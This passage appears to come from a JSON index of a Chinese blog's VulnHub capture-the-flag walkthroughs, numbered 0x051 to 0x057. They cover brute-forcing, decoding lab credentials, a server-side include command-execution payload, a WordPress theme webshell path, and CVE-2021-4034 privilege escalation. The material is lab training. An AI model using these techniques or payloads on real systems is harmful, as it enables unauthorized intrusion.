/\u003e\r\n\u003c/p\u003e\n\u003cp\u003e拿到信息，提示让我们补全后两位：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEec0702de1129a7a2bfe2360c81284151%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e只能生成字典了，这里需要学习Crunch工具的使用方法：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://blog.csdn.net/qq_63844103/article/details/127979575\"\u003ehttps://blog.csdn.net/qq_63844103/article/details/127979575\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e大概就是，数字，字符，大小写字母的组合\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcf1eec2feebaa35cdf0596d7462d0f91%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2037fe5676ff869725ca6d97c3351290%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这次就爆破成功了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6f1a3287e8af42d994923dfdbfb27687%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现内容：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcf8b1ecdeb729272edada5550c6d17fb%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e试密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE22cfcc8cfecaf154fc5231bb174622fa%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x051 sahu 1.1"},{"content":"端口扫描 渗透 21端口，可以匿名登录，发现一个可疑线索：\nPumpkinToken : 2d6dbbae84d724409606eddd9dd71265\n80端口\n发现可疑线索：\nHey Jack!\nThanks for choosing our local store. Hope you like the services.\nTracking code : 2542 8231 6783 486\n-Regards\nadmin@pumpkins.local\ntoken?:\n浏览器携带看看，可能是用来访问其他几个页面的：\n多次组合都发现失败了：\n然后修改了hosts文件\n再次访问：\n又发现一个token:\nPumpkinToken : 06c3eb12ef2389e2752335beccfb2080\nwpscan:\ncewl收集的字典爆破失败了，用rockyou挂着爆破吧：\n然后再对http://pumpkins.local进行一次扫描：\n发现这么一个东西：\nK82v0SuvV1En350M0uxiXVRTmBrQIJQN78s\n这些东西到底要怎么用呢？\n最后没法了，看WP了，说这个东西是base62，之前我试过CyberChef的智能破解，但是没破解出来：\n服了：\nmorse \u0026amp; jack : Ug0t!TrIpyJ\n登录wordpress:\n又发现一个token:\nPumpkinToken : 7139e925fd43618653e51f820bc6201b\n尝试getshell失败，后面又看了wp，不是我吐槽，我是真没想到这是密码：\n但是，讲道理我是用过cewl收集密码，然后用wpscan去爆破的，这个不应该啊，然后我看了一下cewl收集的字典：\n收集是收集了的，但是：没有！\n然后登录admin:\n又是一个token，但是这个东西有什么用吗？\nPumpkinToken : f2e00edc353309b40e1aed18e18ab2c4\n本来以为拿到了admin就能getshell了，但是兜兜转转好像还是不行，\n给我说，可以用harry去爆破ftp，我觉得以后不太能直接用cewl了，感觉没有手动的好用：\n密码为yrrah\n套了一层又一层的目录，被我找到一个data.txt以及又一个token,\n好像是个压缩包\n这个压缩包解压也是一层套一层：\n先是tar、然后是bzip2、然后是tar\n看样子是二进制文件：\n之前遇到过：\n然后登录又发现这样的问题：\n经过排错，发现是ssh版本的问题，这样的问题在打靶机的过程中不少见，但是每次遇到报错都容易误导人：\necho \u0026ldquo;PubkeyAcceptedKeyTypes +ssh-rsa\u0026rdquo; | sudo tee -a /etc/ssh/ssh_config\n提权 这靶机打的时间有点长，人都打懵了，我sudo -l，琢磨着半天，我没密码啊，没想到我其实是有密码的：\nUg0t!TrIpyJ\n反弹shell:\n总结 相当长一段时间没有写总结了，主要是之前的靶机没有太多总结的必要，这个靶机的难度我觉得主要有两个，一个是base62的加密，一个是海量的信息，很容易产生误导，由此让我觉得必须做一个比较规范的操作方法才更好，让思路不存在死角。\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x052-pumpkinfestival/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2a2160290ff84d0bac25efc53f27e018image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb2c2736f59113e1cb2ad1b45d9ca98deimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE752c4087bfb18918c0e91024f81b73c9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e21端口，可以匿名登录，发现一个可疑线索：\u003c/p\u003e\n\u003cp\u003ePumpkinToken : 2d6dbbae84d724409606eddd9dd71265\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEde054088f8daddc2450d85e1e216b4c8image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e80端口\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc80fe9bbb367538c48dd50d69f4075ddimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEdae99a97e1b4903b9f5f0049d1766561image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现可疑线索：\u003c/p\u003e\n\u003cp\u003eHey Jack!\u003c/p\u003e\n\u003cp\u003eThanks for choosing our local store. Hope you like the services.\u003c/p\u003e\n\u003cp\u003eTracking code : 2542 8231 6783 486\u003c/p\u003e\n\u003cp\u003e-Regards\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"mailto:admin@pumpkins.local\"\u003eadmin@pumpkins.local\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE24433be8e1bf21e56e0842ef74eebbdaimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003etoken?:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE48e54729ac264037152ab08e189b97feimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e浏览器携带看看，可能是用来访问其他几个页面的：\u003c/p\u003e\n\u003cp\u003e多次组合都发现失败了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9fac0fa1d058fd739eee174ff04bf584image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后修改了hosts文件\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE644d1159228a8e884adf35a89c828261image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e再次访问：\u003c/p\u003e\n\u003cp\u003e又发现一个token:\u003c/p\u003e\n\u003cp\u003ePumpkinToken : 06c3eb12ef2389e2752335beccfb2080\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfa02f6e2dd77b2b7f7bbd9110f3da885image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ewpscan:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE42d2b86845076acf037181b53653b3b6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ecewl收集的字典爆破失败了，用rockyou挂着爆破吧：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE341fd3ab0828cbf75a3e9aa4c91d0500image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3075c9bcfaaf3e7bad5ebc32f6d6164fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后再对\u003ca href=\"http://pumpkins.local\"\u003ehttp://pumpkins.local\u003c/a\u003e进行一次扫描：\u003c/p\u003e","title":"0x052 PumpkinFestival"},{"content":"端口扫描 渗透 21端口\n可能存在jack用户，以及提到了PumpkinGarden\n1515端口\n提示说，南瓜图片可能能帮助我，以及在under the hood？\n尝试查看了一下首页的图片，没有发现东西\n遂端口扫描，发现img\n看看里面有什么好东西：\nc2NhcmVjcm93IDogNVFuQCR5\n这些图片又看了一下，没有隐藏信息，那么这个字符串是用来干嘛的？\nscarecrow : 5Qn@$y\n居然登录成功了：\n提权 发现是goblin用户的密码：\n还有提示：\n但是sudo就可以提权：\nCongratulations!\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x053-pumpkingarden-/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8f48023944d46d52b206328bd86b2806image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2af349a70c97663909a94dfad0a654a5image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc04468d25bf498f4746b82fc374ec41bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e21端口\u003c/p\u003e\n\u003cp\u003e可能存在jack用户，以及提到了PumpkinGarden\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE394da7310347d4efc508845a87ac3861image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e1515端口\u003c/p\u003e\n\u003cp\u003e提示说，南瓜图片可能能帮助我，以及在under the hood？\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE31af89c66e13be78e1dc4cbf70ceafc5image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e尝试查看了一下首页的图片，没有发现东西\u003c/p\u003e\n\u003cp\u003e遂端口扫描，发现img\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1e0557e1b2eb79716a48a6595499f8fbimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e看看里面有什么好东西：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEbec7482571ab3c2ee2891c8e0233313aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ec2NhcmVjcm93IDogNVFuQCR5\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1c20635d4ab26d58da5d912765175a85image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这些图片又看了一下，没有隐藏信息，那么这个字符串是用来干嘛的？\u003c/p\u003e\n\u003cp\u003escarecrow : 5Qn@$y\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE364aaf5263d963514551a40263b72b54image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e居然登录成功了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE87d8fe7ee6dc93ebe5898828550c0089image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa727f8fca930152128d6142faa9de61dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2b0855dd7a86366034cec844c4bd9e22image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现是goblin用户的密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE34bdc0351488c9c1fbd50601e0b3caefimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e还有提示：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd6d0988c0498cacd89b2773bf0b0f7b9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是sudo就可以提权：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2a48d17de6802a9d5adc2973e9efe4f3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0c7f73d2455ec8afc6f9b8221b303295image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eCongratulations!\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE065c564a08f04e0260ced7b1217a4038image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x053 PumpkinGarden "},{"content":"端口扫描 渗透测试 80端口\n说实话，多次感觉gobuster的中等字典，咋还没dirsearch的默认字典好用呢：\nmysql和ssh失败了：\n看看8080端口\n使用eder/vipsu登录成功：\n提权 2021-4034\n作者留下的提权方式：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x054-jarbas/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE38785096148b8e5db673cb8e0a12a48aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE96e0162121af7aa516be4203f61ef1b8image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4153e59ef9980813fd6c8c0c603c047aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透测试\"\u003e渗透测试\u003c/h1\u003e\n\u003cp\u003e80端口\u003c/p\u003e\n\u003cp\u003e说实话，多次感觉gobuster的中等字典，咋还没dirsearch的默认字典好用呢：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE022266c6cfe43babc606c2ab5cbd5b7dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9f9b29c59f56d410384fdd7c080f9701image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf009f6657d339445153be758f70c74ecimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003emysql和ssh失败了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb327c8056211b7ccf7bead9a0c456d2fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e看看8080端口\u003c/p\u003e\n\u003cp\u003e使用eder/vipsu登录成功：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3b42fda86ab2c833ad155d2d38c47ff2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE558426b14403f96ae3f676fc6a5f0013image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e2021-4034\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE22d44548d40ed578bf49ca27ced9b3fcimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e作者留下的提权方式：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfb2acbbd44019f0997132d74052b4655image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE58114db794bd63b828702a17d852bf86image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE94c440b6b6ea4410c9a21974e7de6fcbimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE69bc17edc3990b28ffe2ad5f86684bb5image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x054 Jarbas"},{"content":"端口扫描 渗透 其实这里是看了WP了，在扫描的时候，其实是发现了SSI这个目录的，当时也搜了一下这个漏洞，但是没反应过来，同时也是由于这个漏洞之前没有接触过：\n这里明显是执行了ls命令的：\n同时还有提示：\n文件命也暴露了一丝提示：\n把上面的语句，复制一下：\n可以发现执行不了有语法错误，且，是过滤了一些内容：\n标准payload：\n\u0026lt;!--#exec cmd=\u0026#34;id\u0026#34; --\u0026gt; 接下来就简单了，反弹shell:\n提权 有gcc直接内核提权把：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x055-h.a.s.t.e-1-/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0370052e26d46b6559861beec2b99d69image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8b76b0f91c82d0170dd347b0eddb5c6fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7466d2ad62ca97c5f459fa22489821dfimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfc30456622a98a5f3b7b50d3b350636eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE096d27d15ffa046032debde743131e7dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e其实这里是看了WP了，在扫描的时候，其实是发现了SSI这个目录的，当时也搜了一下这个漏洞，但是没反应过来，同时也是由于这个漏洞之前没有接触过：\u003c/p\u003e\n\u003cp\u003e这里明显是执行了ls命令的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE208bd7b82189031604e69b4d0e5d89deimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e同时还有提示：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEec67167b1b780f559d9f27123d8d1508image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e文件命也暴露了一丝提示：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7e27d1a7188bb01bab096792984e9afbimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e把上面的语句，复制一下：\u003c/p\u003e\n\u003cp\u003e可以发现执行不了有语法错误，且，是过滤了一些内容：\u003c/p\u003e\n\u003cp\u003e标准payload：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e\u0026lt;!--#exec cmd=\u0026#34;id\u0026#34; --\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE79f31937ea742c710b7ecaaa3799abd9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003c!-- raw HTML omitted --\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE307fe12568ea57b3847c8efebb6a679fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e接下来就简单了，反弹shell:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE48fc139b7e0762ee3f6ff6d116135f6fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE91444acad99a53a05a83b7178c9fc852image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2ef1a4f9e635aa9d171bc63a5832195eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe686891964243f53b306ae480d53495dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e有gcc直接内核提权把：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7bc3b851776ad117fa1b23f852a1ccf8image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x055 H.A.S.T.E 1 "},{"content":"端口扫描 渗透 21端口\n啥也没有\n这靶机打得san值狂掉，那个图片看得很难受，主页里面两个图片，1.gif，2.gif难受，别看，很难受\n疑似数据库名称：\nLepton\n有一个叫LEPTON的cms:\n还有wordpress:\nwpsacn\n插件：\n用户\n直接爆破\n后台getshgell:\nhttp://192.168.5.101/wordpress/wp-content/themes/twentyfourteen/404.php\n提权 home目录下有用户btrisk，可以尝试登录数据库看看：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x056-btrsys-v2.1/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8653e5494ecd348115306a8aee5136c4image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0f9af20f133963c0637d25e5b4a2615aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7065f2574e44403268b89c8dfdf0371eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e21端口\u003c/p\u003e\n\u003cp\u003e啥也没有\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4f09c87a1e4fbc616038b85b165cec27image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这靶机打得san值狂掉，那个图片看得很难受，主页里面两个图片，1.gif，2.gif难受，别看，很难受\u003c/p\u003e\n\u003cp\u003e疑似数据库名称：\u003c/p\u003e\n\u003cp\u003eLepton\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6c74345a23a3aacc00ce044c33ac7b52image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e有一个叫LEPTON的cms:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc165e6fa3c7ec90a8aaeb6ccca6d5a45image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e还有wordpress:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcf5e4096223bb26f91f3888cceb485f8image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ewpsacn\u003c/p\u003e\n\u003cp\u003e插件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb403993834fa0222bf4f90ba994e1e24image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e用户\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf1084c55838b01985d5fa44e010c3373image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e直接爆破\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE598d8be91bbbf69ffc35a6a2ac842d19image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e后台getshgell:\u003c/p\u003e\n\u003cp\u003ehttp://192.168.5.101/wordpress/wp-content/themes/twentyfourteen/404.php\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf1795c64f2261ff15d9ab7bb222beab7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE80afc6ca0d2b22f75f954eff9bd177afimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ehome目录下有用户btrisk，可以尝试登录数据库看看：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9ca045245b72930d0efd79dae4f36277image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe201c14d1b4a093061f099b0d344de15image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf92edf4c6eeea7aecc3ee3ce32581a62image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x056 BTRSys v2.1"},{"content":"端口扫描 渗透 21端口\n没有匿名登录，但是好像有用户名提示\n80端口\n什么意思呢：\n收集一下目前的单词：\n可能用到账户号密码的地方：ftp\\ssh\\首页图片，那就挨个试了吧\n发现还是不对，线索断了，搜了一下，发现这个靶机相当有意思\n没想到，这个页面是随机的，刷新后就不一样了：\n对这个目录再次爆破：\n但是看这段对话还是一头雾水：\n然后看wp，我是真的没想到这里面能藏信息的，注意看本机发给靶机的几个包：\n按顺序为：77，101，108，108，111，110，54，57\nascii码对应为：\n这是ftp的密码：\n虽然没有写入权限，但是有线索：\nQlVraKW4fbIkXau9zkAPNGzviT3UKntl\n访问：\n加盐的MD5破解：\n这里我其实是没找到hashcat的破解格式的：\n后面又查了一些资料：\n稍微处理了一下：\nhydra爆破有拒绝，用\n有点严格，算了，手动试吧：\n服了：\nOri\nspanky\n提权 2021-4034可以提权：\n作者留下的提权方式：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x057-moria-1.1-/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcacaae954e8d23744a4041baa57d1ba3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe8b6d1d91ecfaf277eea7160cc9902ddimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3ff8278fa61995fcc0fe922ea689a529image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 